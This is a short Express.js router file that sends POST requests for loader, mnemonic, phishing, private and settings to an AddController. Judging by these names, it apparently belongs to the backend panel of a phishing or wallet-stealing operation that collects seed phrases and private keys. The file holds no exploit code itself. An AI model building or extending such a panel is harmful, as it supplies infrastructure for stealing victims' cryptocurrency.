const Router = require('express');
const router = new Router();

const AddController = require('../controller/AddController');

router.post('/loader', AddController.AddToPanelLoader);
router.post('/mnemonic', AddController.AddToPanelMnemonic);
router.post('/phishing', AddController.AddToPanelPhishing);
router.post('/private', AddController.AddToPanelPrivate);
router.post('/settings', AddController.AddToPanelSettings);
router.post('/software/:id', AddController.checkTileAndReturnData);

module.exports = router;